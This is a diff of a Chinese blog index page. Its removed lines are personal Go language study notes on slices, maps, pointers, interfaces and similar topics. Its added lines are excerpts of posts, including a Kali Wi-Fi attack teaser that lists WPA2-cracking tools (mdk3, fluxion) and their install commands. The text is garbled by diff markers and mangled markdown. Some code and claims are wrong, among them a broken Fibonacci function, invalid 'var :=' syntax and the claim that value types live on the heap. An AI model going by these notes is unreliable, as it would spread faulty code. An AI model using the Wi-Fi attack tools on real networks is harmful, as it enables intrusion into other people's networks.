-     	vname2 v_type2
-     )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="值类型"><a href="#值类型" class="headerlink" title="值类型"></a>值类型</h3><ol>
-<li>  所有像int,float,bool,string这些基本类型都属于值类型，使用这些类型的变量都直接指向存在内存中的值</li>
-<li>  当使用等号 <code>=</code> 将一个变量的值赋值给另一个变量时，如：<code>j = i</code>，实际上是在内存中将 i 的值进行了拷贝：</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921210003.png"></li>
-<li>  <strong>值类型变量的值都存储在堆中</strong></li>
-</ol>
-<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><ol>
-<li>  一个引用类型的变量存储的是这个变量所在的内存地址，或者内存地址中第一个字所在的位置</li>
-<li>  并不是去直接存值</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220921210544.png"></li>
-<li>  当使用赋值语句r2 = r1时，只有引用地址被复制</li>
-<li>  <strong>如果r1的值改变了，那么这个值的所有引用都会指向被修改后的内容</strong>，在这个例子中，r2也会受到影响</li>
-</ol>
-<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol>
-<li>  如果在相同的代码块中，我们<strong>不可以再次对于相同名称的变量使用初始化声明</strong></li>
-<li>  在函数中单纯地给 a 赋值（将a定义为非全局变量）也是不够的，这个值必须被使用（就是声明定义的变量必须使用）</li>
-<li>  但是全局变量是允许声明但是不使用的，同一个类型的多个变量可以声明在同一行</li>
-<li>  交换两个变量的值：a,b=b,a  两个变量的类型必须相同</li>
-<li>  空白标识符也被用于抛弃值， _,b = 5,7 ,将得到结果为a没有值，b的值为7</li>
-</ol>
-<h3 id="简短形式"><a href="#简短形式" class="headerlink" title="简短形式"></a>简短形式</h3><ol>
-<li>  使用 := 赋值操作符</li>
-<li>  声明语句写var显得有些多余了，如果不是定义全局变量，则不需要写var</li>
-<li>  变量的首选是用 := ，但是只能被用于函数体内，而不可以用于全局变量的声明与赋值</li>
-</ol>
-<h2 id="go语言常量"><a href="#go语言常量" class="headerlink" title="go语言常量"></a>go语言常量</h2><ol>
-<li><p>```go<br>  const identifier [type] = value</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   可以省略类型说明符，因为编译器可以根据变量的值来推断其类型
-
-3.   &#96;&#96;&#96;go
-     const b string &#x3D; &quot;abc&quot; &#x2F;&#x2F;显示声明
-     const b &#x3D; &quot;abc&quot; &#x2F;&#x2F;隐式声明<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  常量可以用作枚举</p>
-</li>
-<li><p>```go<br>  const (</p>
-<pre><code>  Unknown = 0
-  Female = 1
-  Male = 2
-</code></pre>
-<p>  )</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-6.   常量表达式中，函数必须是内置函数，否则编译不过
-
-7.   &#96;&#96;&#96;go
-     const (
-     	a &#x3D; &quot;abc&quot;
-     	b &#x3D; len(a)
-     	c &#x3D; unsafe.Sizeof(a)
-     )<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="特殊常量-iota"><a href="#特殊常量-iota" class="headerlink" title="特殊常量 iota"></a>特殊常量 iota</h3><ol>
-<li><p>  iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p>
-</li>
-<li><p>  iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p>
-</li>
-<li><p>  第一个 iota 等于 0，每当 iota 在新的一行被使用时，它的值都会自动加 1</p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import “fmt”</p>
-<p>  func main() {</p>
-<pre><code>  const (
-          a = iota   //0
-          b          //1
-          c          //2
-          d = &quot;ha&quot;   //独立值，iota += 1
-          e          //&quot;ha&quot;   iota += 1
-          f = 100    //iota +=1
-          g          //100  iota +=1
-          h = iota   //7,恢复计数
-          i          //8
-  )
-  fmt.Println(a,b,c,d,e,f,g,h,i)
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   我的理解：**第一个iota为0，每更新一行时，iota会自动+1,如果遇到了String类型的数据，String的值不会改变**，在const中枚举，如果重新给某个变量进行了赋值，则会自动摒弃iota
-
-## 左右移
-
-1.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220924104333.png)
-2.   左移为 * 2的n次方
-3.   右移为 &#x2F; 2的n次方
-
-## go语言条件语句
-
-1.   go没有三目运算符，所以不支持 **?:** 形式的条件判断
-2.   go所有的二目运算符都是从左向右执行的
-3.   select语句，如果有多个case都可以执行，select会随机公平地选出一个执行，其它的不会执行
-4.   如果有default子句，则执行该语句
-5.   如果没有default子句，select将阻塞，直到某个通信可以运行；go不会重新对channel或值进行求值
-
-## 循环
-
-1.   for-each循环的**第一个元素肯定是下标，第二个元素才是值**
-
-2.   &#96;&#96;&#96;go
-     for i,s :&#x3D; range strings<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  <strong>使用range关键字</strong></p>
-</li>
-</ol>
-<h2 id="循环中的goto语句"><a href="#循环中的goto语句" class="headerlink" title="循环中的goto语句"></a>循环中的goto语句</h2><ol>
-<li>  goto语句可以无条件地转移到过程中指定的行</li>
-<li>  goto语句通常与条件语句配合使用，可用来实现条件转移， 构成循环，跳出循环体等功能</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924110303.png"></li>
-<li>  goto loop</li>
-</ol>
-<h2 id="go语言数组"><a href="#go语言数组" class="headerlink" title="go语言数组"></a>go语言数组</h2><ol>
-<li><p>  等号右边先定义维度，然后定义类型，最后来个大括号</p>
-</li>
-<li><p>  全看：var 数组名 = [size] type {}</p>
-</li>
-<li><p>```go<br>  var variable_name [SIZE] variable_type</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   &#96;&#96;&#96;go
-     var balance [10] float32 &#x2F;&#x2F;var 数组名 [size] 类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  初始化，等号，大括号</p>
-</li>
-<li><p>```go<br>  var balance = [5]float{1,2,3,4,5}</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-5.   也可以通过字面量在声明数组的同时快速初始化数组
-
-6.   &#96;&#96;&#96;go
-     var balance :&#x3D; [5]float&#123;1,2,3,4,5&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  在初始化数组时，如果长度不确定，可以使用 <strong>…</strong> 来代替数组的长度，编译器会根据元素的个数自动推断数组的个数</p>
-</li>
-<li><p>```go<br>  var balance = […]float{1,2,3,4}<br>  balance := […]float{1,2,3,4,5}</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-9.   注意，变量的类型一定在变量名的后面
-
-### 多维数组
-
-&#96;&#96;&#96;gp
-var variable_name [1][2][3] variable_type
-var threedim [1][2][3]int<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  初始化二维数组</p>
-</li>
-<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220924194448.png"></p>
-</li>
-<li><p>  如果最后一个元素和结尾的 <strong>}</strong> 不位于同一行，则需要最后元素后添加一个逗号</p>
-</li>
-<li><p>  如果位于同一行，则可以不带逗号</p>
-</li>
-<li><p>  总之，最后一行的 <strong>}</strong> 不能单独一行</p>
-</li>
-</ol>
-<h2 id="go指针"><a href="#go指针" class="headerlink" title="go指针"></a>go指针</h2><ol>
-<li>  当一个指针被定义后没有分配到任何变量时，它的值为 <strong>nil</strong></li>
-<li>  nil指针也被称为空指针</li>
-<li>  指针数组存地址，令每一个元素都指向一个值</li>
-</ol>
-<h2 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h2><ol>
-<li><p>  type和struct关键字，type语句设定了结构体的名称</p>
-</li>
-<li><p>```go<br>  type name struct {</p>
-<pre><code>  member definition
-  member
-  member
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   变量的声明
-
-4.   &#96;&#96;&#96;go
-     variable_name :&#x3D; structure_variable_name &#123;value1,value2,value3&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  当定义结构体时，不一定需要使用某个结构体中的所有属性，即可以有几个属性不带</p>
-</li>
-</ol>
-<h2 id="go语言切片"><a href="#go语言切片" class="headerlink" title="go语言切片"></a>go语言切片</h2><ol>
-<li><p>  数组长度不可改变，但是切片的长度是可以改变的，而已追加元素，在追加时可能使切片的容量增大</p>
-</li>
-<li><p>```go<br>  var identifier []type //声明一个未指定大小的数组来定义切片，不建议使用<br>  //或者使用make()函数来创建切片<br>  var slice1 []type = make([]type,len)<br>  slice1 := make([]type,len)<br>  //也可以指定容量，其中capacity为可选参数<br>  make([]T,length,capacity)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   切片就是没有指定长度的数组
-
-### 获取数组中的值
-
-&#96;&#96;&#96;go 
-b :&#x3D; a[:] &#x2F;&#x2F;获取数组中的所有值，这也是基于数组的切片定义，此时b是一个切片而不是数组，b没有长度限制<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  获取切片的值是前包后不包的，即 <strong>[1:4]</strong> 的取值实际上是1~3</p>
-</li>
-</ol>
-<h3 id="获取切片的长度和容量"><a href="#获取切片的长度和容量" class="headerlink" title="获取切片的长度和容量"></a>获取切片的长度和容量</h3><ol>
-<li>  len()函数来获取切片的长度</li>
-<li>  cap()函数来获取切片的容量</li>
-<li>  <strong>切片容量是从它的第一个元素开始数，到其底层数组元素末尾的个数，如果是基于数组的，就是到其数组的最后一个位置，即使限定了最后的下标[,end]</strong></li>
-<li>  <strong>切片的长度就是它所包含的元素个数</strong></li>
-</ol>
-<h3 id="用make函数创建切片"><a href="#用make函数创建切片" class="headerlink" title="用make函数创建切片"></a>用make函数创建切片</h3><ol>
-<li><p>```go<br>  make([]T,len,cap)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-2.   第一个参数是类型，第二个参数是长度，第三个长度是容量
-
-
-
-### 切片扩容
-
-1.   使用go语言内置函数，append()可以为切片动态添加元素，每个切片会指向一个底层数组
-2.   append()等号前写用哪个变量去接收，append()的第一个参数写地址，第二个参数是添加的值
-
-### 切片合并
-
-1.   append(sliceA,sliceB...)
-
-2.   第一个参数是加到哪里，第二个参数是用什么加，第二个参数后面会自动加上 **...**
-
-3.   &#96;&#96;&#96;go
-     	sliceA :&#x3D; []string&#123;&quot;php&quot;,&quot;java&quot;&#125;
-     	sliceB :&#x3D; []string&#123;&quot;nodejs&quot;,&quot;go&quot;&#125;
-     
-  sliceA &#x3D; append(sliceA,sliceB...) &#x2F;&#x2F;注意这个地方是重新赋值，而不需要声明，因此不用 :&#x3D; ,用 &#x3D; ，另外，要在用于扩容的数组后面加上三个点
-     	fmt.Println(sliceA)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  上面这个例子是将sliceB合并到sliceA的后面，然后重新赋值给sliceA</p>
-</li>
-</ol>
-<h3 id="切片是一种引用类型，如果想要不同时改变，则使用copy-函数"><a href="#切片是一种引用类型，如果想要不同时改变，则使用copy-函数" class="headerlink" title="切片是一种引用类型，如果想要不同时改变，则使用copy()函数"></a>切片是一种引用类型，如果想要不同时改变，则使用copy()函数</h3><ol>
-<li><p>  copy()函数是赋值，而不会发生引用</p>
-</li>
-<li><p>  即使用copy()函数不会同时修改sliceA和sliceB</p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import “fmt”</p>
-<p>  func main() {</p>
-<pre><code>  sliceA := []int&#123;1,2,3,4,5&#125;
-  sliceB := make([]int,5,6) //第一个参数是被赋值，第二个参数是用什么去赋值，copy(被赋值，用什么去赋值);
-  copy(sliceB,sliceA)
-
-  fmt.Println(sliceA)
-  fmt.Println(sliceB)
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-### 删除切片中的元素
-
-&#96;&#96;&#96;go
-a :&#x3D; []int&#123;1,2,3,4,5&#125;
-a &#x3D; append(a[:2],a[3:]...)
-&#x2F;&#x2F;和链表的删除操作思路相同，将一个切片分成两段，前一段和后一段之间是要shan&#39;ch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h2><h3 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h3><ol>
-<li>```go<br>  var var_name *var_type<br>  var ip *int<br>  var fp *float32  <pre class="line-numbers language-none"><code class="language-none">
-### 指针数组
-
-&#96;&#96;&#96;go
-package main
-
-import &quot;fmt&quot;
-
-const MAX int &#x3D; 4
+import "fmt"
 
 func main() &#123;
-	a :&#x3D; []int&#123;0,1,2,3&#125;
-	var i int
-	var ptr [MAX]*int
-
-	for i &#x3D; 0;i &lt; MAX;i++ &#123;
-		ptr[i] &#x3D; &amp;a[i]
-	&#125;
-
-	for i &#x3D; 0;i &lt; MAX; i++ &#123;
-		fmt.Printf(&quot;a[%d] &#x3D; %d&quot;,i,*ptr[i])
-	&#125;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="指针作为函数的参数"><a href="#指针作为函数的参数" class="headerlink" title="指针作为函数的参数"></a>指针作为函数的参数</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
-
-<span class="token keyword">import</span> <span class="token string">"fmt"</span>
-
-<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">var</span> a <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span>
-	<span class="token keyword">var</span> b <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">200</span>
-
-	<span class="token function">swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span>
-
-	fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">func</span> <span class="token function">swap</span><span class="token punctuation">(</span>x <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">,</span>y <span class="token operator">*</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token operator">*</span>x<span class="token punctuation">,</span><span class="token operator">*</span>y <span class="token operator">=</span> <span class="token operator">*</span>y<span class="token punctuation">,</span><span class="token operator">*</span>x
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h2 id="结构体-1"><a href="#结构体-1" class="headerlink" title="结构体"></a>结构体</h2><h3 id="定义结构体"><a href="#定义结构体" class="headerlink" title="定义结构体"></a>定义结构体</h3><ol>
-<li>```go<br>  type struct_variable_type struct {<pre><code>  member definition
-  member definition
-</code></pre>
-  }  <pre class="line-numbers language-none"><code class="language-none">
-2.   忽略的字段将为0或者为空
-
-3.   也可以使用 key&#x3D;&gt;value 的形式,使用键值对的形式可以不用按照顺序去定义
-
-4.   &#96;&#96;&#96;go
-     Books&#123;title: &quot;&quot;,author: &quot;&quot;,subject: &quot;&quot;,book_id: &quot;&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="结构体作为函数的参数"><a href="#结构体作为函数的参数" class="headerlink" title="结构体作为函数的参数"></a>结构体作为函数的参数</h3><pre class="line-numbers language-none"><code class="language-none">func printBook(book Books) &#123;
-	fmt.Printf(book.title)
+	fmt.Println("Hello world")
 &#125;
 
-func name(var_name var_type) &#123;
-	fmt.Printf(var_name.value)
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+go语言基础组成
+  包声明
+  引入包
+  函数
+  函数
+  变量
+  语句&amp;表达式
+  注释
 
-
-<h3 id="结构体指针"><a href="#结构体指针" class="headerlink" title="结构体指针"></a>结构体指针</h3><ol>
-<li><p>```go<br>  var struct_pointer *Books<br>  //使用指针变量存储结构体变量的地址<br>  struct_pointer = &amp;Book1<br>  //使用结构体指针访问结构体成员<br>  struct_pointer.title</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-
-
-## 范围range
-
-1.   range用于for循环中迭代数组，切片，通道，集合元素
-
-2.   数组和切片中它返回元素的索引和对应的值，在集合中返回key-value对
-
-3.   &#96;&#96;&#96;go
-     for key,value :&#x3D; range oldMap &#123;
-     	newMap[key] &#x3D; value
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>  for循环的range可以省略key和value</p>
-</li>
-<li><p>```go<br>  package main</p>
-<p>  import “fmt”</p>
-<p>  func main() {</p>
-<pre><code>  map1 := make(map[int]float32)
-  map1[1] = 1.0
-  map1[2] = 2.0
+各个部分
   
-  for key,value := range map1 &#123;
-      fmt.Printf(&quot;key: %d,value %f&quot;,key,value)
-  &#125;
+  第一行代码 package main 定义了包名。你必须在源文件中非注释的第一行指明这个文件属于哪个包，如：package main。package main表示一个可独立执行的程序，每个 Go 应用程序都包含一个名为 main 的包。
+  下一行 import “fmt” 告诉 Go 编译器这个程序需要使用 fmt 包（的函数，或其他元素），fmt 包实现了格式化 IO（输入/输出）的函数  fmt包：format
+  下一行 func main() 是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。
+  下一行 /…/ 是注释，在程序执行时将被忽略。单行 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%8F%96%E6%B6%88%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%94%BB%E5%87%BB/" title="取消身份认证攻击">取消身份认证攻击</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-14T08:14:17.138Z" title="发表于 2022-09-14 16:14:17">2022-09-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">取消身份认证攻击
+  经同意转载自队友毕师傅博客
+  kali WIFI攻击 | 惜缘怀古的博客 (gitee.io)
+
+</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/kali-WIFI%E6%94%BB%E5%87%BB/" title="kali WIFI攻击"><img class="post-bg" src="https://xyhutc.oss-cn-qingdao.aliyuncs.com/giteetuchuang/f08e07cfb3768ac97a690c2dd413eac72a68ae86_raw.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kali WIFI攻击"></a></div><div class="recent-post-info"><a class="article-title" href="/kali-WIFI%E6%94%BB%E5%87%BB/" title="kali WIFI攻击">kali WIFI攻击</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-13T12:26:16.000Z" title="发表于 2022-09-13 20:26:16">2022-09-13</time></span></div><div class="content">无线渗透攻击准备工作  首先呢我们我们来看一下渗透之前需要准备的工具。
+
+kali linux系统
+
+监听网卡
+
+aircark-ng套件
+
+mdk3工具
+
+fluxion工具
+
+
+上面的这些准备工作需要特点注意的一点是这个监听网卡，注意在某宝购买的过程中一定要注意购买的网卡是否是双频，我在购买的时候没有注意，所以购买的是单频网卡也就是2.4G版本的，没有办法收到5G频段，现在家用主流的路由器基本上都是双频，所以只能攻击单频段的话通常会自动跳转到另一个频段导致无法抓取数据包。关于aircark-ng套件在kali是内置的，mdk3以及fluxion需要下载一下。
+apt-get install mdk3
+git clone https:&#x2F;&#x2F;github.com&#x2F;FluxionNetwork&#x2F;fluxion.git
+
+
+
+无线攻击目前市面上主流路由器的加密方式是WPA2，是WPA的升级版，它们的区别是，WPA2使用更安全的加密技术AES ，因此比WPA更难破解，也更安全。 但是依旧会被攻击，本章节测试环境就是以WPA2加密的路由器进行的。说起无线局 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="无题">无题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-09-07T03:42:07.790Z" title="发表于 2022-09-07 11:42:07">2022-09-07</time></span></div><div class="content">流量分析
+  打开是一个流量包
   
-  for key := range map1 &#123;
-      fmt.Printf(&quot;key is: %d&quot;,key)
-  &#125;
+  添加http的过滤器
   
-  for _,value := range map1 &#123;
-      fmt.Printf(&quot;value is: %f&quot;,value)
-  &#125;
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-## map集合
-
-1.   无序的键值对的集合
-
-2.   可以通过key来快速地检索数据，类似于索引，指向数据的值
-
-3.   map是一种集合，可以进行迭代，但是是无序的，无法决定它的返回顺序，因为map是通过hash来实现的
-
-4.   &#96;&#96;&#96;go
-     package main
-     
-     import &quot;fmt&quot;
-     
-     func main() &#123;
-         var countryCapitalMap map[string]string &#x2F;&#x2F;map的声明: map[键的类型]值的类型
-     	countryCapitalMap &#x3D; make(map[string]string)
-     
-     	countryCapitalMap [&quot;france&quot;] &#x3D; &quot;巴黎&quot;
-     	countryCapitalMap [ &quot;Italy&quot; ] &#x3D; &quot;罗马&quot;
-         countryCapitalMap [ &quot;Japan&quot; ] &#x3D; &quot;东京&quot;
-         countryCapitalMap [ &quot;India &quot; ] &#x3D; &quot;新德里&quot;
-     
-     	for country :&#x3D; range countryCapitalMap &#123;
-     		fmt.Println(country)
-     	&#125;
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h3><ol>
-<li><p>  delete函数用于删除集合的元素，参数为map和其对应的key</p>
-</li>
-<li><p>```go<br>  delete(map_name,key)<br>  delete(map_name,key)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   &#96;&#96;&#96;go
-     package main
-     
-     import &quot;fmt&quot;
-     
-     func main() &#123;
-     	countryCapitalMap :&#x3D; map[string]string&#123;&quot;France&quot;: &quot;Paris&quot;, &quot;Italy&quot;: &quot;Rome&quot;, &quot;Japan&quot;: &quot;Tokyo&quot;, &quot;India&quot;: &quot;New delhi&quot;&#125;
-     	fmt.Println(&quot;原始地图&quot;)
-     
-     	for country :&#x3D; range countryCapitalMap &#123;
-     		fmt.Println(country,&quot;首都是&quot;,countryCapitalMap[country])
-     	&#125;
-     
-     	delete(countryCapitalMap,&quot;France&quot;)
-     
-     	fmt.Println()
-     
-     	for country :&#x3D; range countryCapitalMap &#123;
-     		fmt.Println(country,&quot;首都是&quot;,countryCapitalMap[country])
-     	&#125;
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="go语言递归"><a href="#go语言递归" class="headerlink" title="go语言递归"></a>go语言递归</h3><ol>
-<li><p>  递归，在运行的过程中调用自己</p>
-</li>
-<li><p>```go<br>  func recursion() {</p>
-<pre><code>  recursion()
-</code></pre>
-<p>  }<br>  func main() {</p>
-<pre><code>  recursion()
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   &#96;&#96;&#96;go
-     package main
-     
-     import &quot;fmt&quot;
-     
-     func fib(n int) int&#123;
-     	if n &lt; 2 &#123;
-     		return n
-     	&#125;
-     	return fib(n-2)*(n-1)
-     &#125;
-     
-     func main() &#123;
-     	var i int
-     	for i &#x3D; 0;i &lt; 10;i++ &#123;
-     		fmt.Printf(&quot;%d\t&quot;,fib(i))
-     	&#125;
-     &#125;
-     &#x2F;&#x2F;斐波那契数列<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h3 id="go语言类型转换"><a href="#go语言类型转换" class="headerlink" title="go语言类型转换"></a>go语言类型转换</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token function">type_name</span><span class="token punctuation">(</span>expression<span class="token punctuation">)</span>
-<span class="token comment">//expression中填变量的名字</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main
-
-<span class="token keyword">import</span> <span class="token string">"fmt"</span>
-
-<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">var</span> sum <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">17</span>
-	<span class="token keyword">var</span> count <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">5</span>
-	<span class="token keyword">var</span> mean <span class="token builtin">float32</span>
-
-	mean <span class="token operator">=</span> <span class="token function">float32</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">float32</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span>
-	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"mean的值为 %f"</span><span class="token punctuation">,</span>mean<span class="token punctuation">)</span>
-<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<ol>
-<li>  <strong>go不支持隐式类型转换</strong>，必须进行显示类型转换，否则会报错</li>
-<li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221006211522.png"></li>
-</ol>
-<h2 id="go语言接口"><a href="#go语言接口" class="headerlink" title="go语言接口"></a>go语言接口</h2><ol>
-<li><p>  将所有具有共性的方法定义在一起，任何其它类型只要实现了这些（全部）方法就是实现了这个接口</p>
-</li>
-<li><p>```go<br>  type interface_name interface {</p>
-<pre><code>  method_name1 [return_type]
-  method_name2 [return_type]
-</code></pre>
-<p>  }</p>
-<p>  func (struct_name_variable struct_name) method_name1() [return_type]}{</p>
-<pre><code>  //方法实现
-</code></pre>
-<p>  }</p>
-  <pre class="line-numbers language-none"><code class="language-none">
-3.   &#96;&#96;&#96;go
-     package main
-     
-     import &quot;fmt&quot;
-     
-     type Phone interface &#123;
-     	call()
-     &#125;
-     
-     type NokiaPhone struct &#123;
-     &#125;
-     
-     func (nokiaPhone NokiaPhone) call() &#123;
-     	fmt.Println(&quot;abc&quot;)
-     &#125;
-     
-     type IPhone struct &#123;
-     &#125;
-     
-     func (iphone IPhone) call() &#123;
-     	fmt.Println(&quot;def&quot;)
-     &#125;
-     
-     func main() &#123;
-     	var phone Phone
-     
-     	phone &#x3D; new(NokiaPhone)
-     	phone.call()
-     
-     	phone &#x3D; new(IPhone)
-     	phone.call()
-     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-<h2 id="go并发"><a href="#go并发" class="headerlink" title="go并发"></a>go并发</h2><ol>
-<li><p>  go语言支持并发，只需要通过关键字go来开启goroutine即可</p>
-</li>
-<li><p>  goroutine是轻量级线程，goroutine的调度是由golang运行时进行管理的</p>
-</li>
-<li><p>```go<br>  go 函数名(参数列表)<br>  go f(x,y,z)</p>
-  <pre class="line-numbers language-none"><code class="language-none">
